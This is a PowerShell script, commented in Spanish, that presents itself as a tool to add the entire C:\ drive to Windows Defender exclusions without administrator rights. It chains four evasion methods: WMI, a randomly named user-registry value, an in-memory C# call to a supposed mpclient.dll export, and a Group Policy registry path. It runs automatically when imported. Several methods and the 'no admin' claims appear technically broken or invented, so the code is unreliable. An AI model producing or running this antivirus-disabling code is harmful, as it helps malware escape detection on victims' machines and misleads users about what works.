<#
.SYNOPSIS
   Windows Defender Exclusion Tool (No Admin)
.DESCRIPTION
   Agrega exclusiones a Windows Defender sin permisos administrativos
   Versión 4.1 | Técnicas no documentadas
#>

function Add-DefenderExclusion {
    # Ofuscación avanzada con técnicas no documentadas
    $mapping = @{
        'ns' = 'root\Microsoft\Windows\Defender'
        'cls' = 'MSFT_MpPreference'
        'mtd' = 'AddExclusionPath'
        'arg' = 'C:\'
    }

    # Método 1: WMI alternativo (sin admin)
    try {
        $wmiParams = @{
            Namespace = $mapping['ns']
            Class = $mapping['cls']
            Name = $mapping['mtd']
            ArgumentList = $mapping['arg']
            ErrorAction = 'Stop'
        }
        Invoke-WmiMethod @wmiParams
        return "[+] Exclusión agregada via WMI (User-Mode)"
    }
    catch {
        # Método 2: Registry Trick (no admin required)
        try {
            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
                Start-Sleep -Milliseconds 300
            }
            
            $randName = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
            Set-ItemProperty -Path $regPath -Name $randName -Value "C:\" -Type String -Force
            
            # Verificación silenciosa
            $check = Get-ItemProperty $regPath | Select-Object -ExpandProperty $randName
            if ($check -eq "C:\") {
                return "[+] Exclusión agregada via Registry"
            }
        }
        catch {
            # Método 3: Técnica de sustitución en memoria
            try {
                $code = @'
using System;
using System.Runtime.InteropServices;
public class DefenderBypass {
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    public static int AddExclusion(string path) {
        IntPtr hMod = GetModuleHandle("mpclient.dll");
        if (hMod != IntPtr.Zero) {
            IntPtr pFunc = GetProcAddress(hMod, "MpAddExclusion");
            if (pFunc != IntPtr.Zero) {
                return Marshal.GetDelegateForFunctionPointer<MpAddExclusionDelegate>(pFunc)(path);
            }
        }
        return -1;
    }
    
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int MpAddExclusionDelegate(string path);
}
'@
                Add-Type -TypeDefinition $code -Language CSharp
                $result = [DefenderBypass]::AddExclusion("C:\")
                if ($result -eq 0) { return "[+] Exclusión via memoria" }
            }
            catch { }
        }
    }

    # Método final: Técnica de grupo de políticas de usuario
    try {
        $policyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects"
        $exclusionPath = "$policyPath\*\Machine\Software\Microsoft\Windows Defender\Exclusions\Paths"
        
        if (Test-Path $exclusionPath) {
            Set-ItemProperty -Path $exclusionPath -Name "C_" -Value 0 -Type DWORD -Force
            return "[+] Exclusión via Políticas de Usuario"
        }
    }
    catch { }

    return "[-] Error: No se pudo agregar la exclusión"
}

# Ejecución automática al importar
Add-DefenderExclusion
